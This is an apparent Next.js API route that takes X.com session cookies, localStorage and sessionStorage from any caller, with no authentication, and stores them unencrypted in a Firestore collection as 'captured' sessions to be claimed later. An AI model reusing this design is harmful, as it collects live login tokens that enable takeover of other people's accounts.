import { NextRequest, NextResponse } from 'next/server'
import { adminDb } from '@/lib/firebase-admin'

export async function POST(request: NextRequest) {
  try {
    const { sessionData, userId } = await request.json()
    
    // Basic validation
    if (!sessionData || !sessionData.cookies) {
      return NextResponse.json({ 
        error: 'Invalid session data. Need cookies from X.com'
      }, { status: 400 })
    }

    // If no userId provided, try to extract from session data or use a temporary ID
    let targetUserId = userId
    
    if (!targetUserId) {
      // Try to find user by matching session characteristics
      // For now, we'll create a temporary session that can be claimed later
      targetUserId = `temp_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    }

    console.log('🔐 Direct X session capture for:', targetUserId)

    // Store the captured X session data
    await adminDb.collection('x_sessions_temp').doc(targetUserId).set({
      cookies: sessionData.cookies,
      localStorage: sessionData.localStorage || {},
      sessionStorage: sessionData.sessionStorage || {},
      userAgent: sessionData.userAgent || '',
      capturedAt: new Date(),
      capturedUrl: sessionData.url || 'x.com',
      isValid: true,
      isDirect: true,
      needsClaiming: !userId // If no userId provided, needs to be claimed
    })

    console.log('✅ Direct X session data captured and stored')

    return NextResponse.json({
      success: true,
      message: 'X session captured successfully',
      sessionId: targetUserId,
      needsClaiming: !userId,
      sessionInfo: {
        cookieCount: Object.keys(sessionData.cookies).length,
        localStorageKeys: Object.keys(sessionData.localStorage || {}).length,
        capturedAt: new Date().toISOString()
      }
    })

  } catch (error) {
    console.error('❌ Error in direct X session capture:', error)
    return NextResponse.json({
      error: 'Failed to capture X session',
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
  }
}
